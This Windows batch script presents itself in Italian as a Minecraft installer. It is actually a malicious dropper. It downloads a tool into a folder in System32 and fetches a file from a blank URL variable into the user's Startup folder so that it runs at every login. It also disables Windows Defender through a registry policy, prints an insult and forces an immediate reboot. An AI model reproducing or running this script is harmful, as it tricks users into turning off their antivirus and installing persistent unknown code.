set github=

@echo l'installer di minecraft si sta avviando Attendi...
@echo off
md C:\Windows\System32\fuckoffwindows
powershell (new-object System.Net.WebClient).DownloadFile('https://www.nirsoft.net/utils/nircmd-x64.zip','C:\Windows\System32\fuckoffwindows\nircmd-x64.zip')
tar nircmd-x64.zip
powershell (new-object System.Net.WebClient).DownloadFile('%github%','C:\Users\vaghi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
@echo attendi mentre estraiamo il contenuto della cartella
timeout /t 10 >nul
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
::riattivarlo ^_^
::reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f
@echo say bye to Windows fucking idiot
shutdown -r -t 1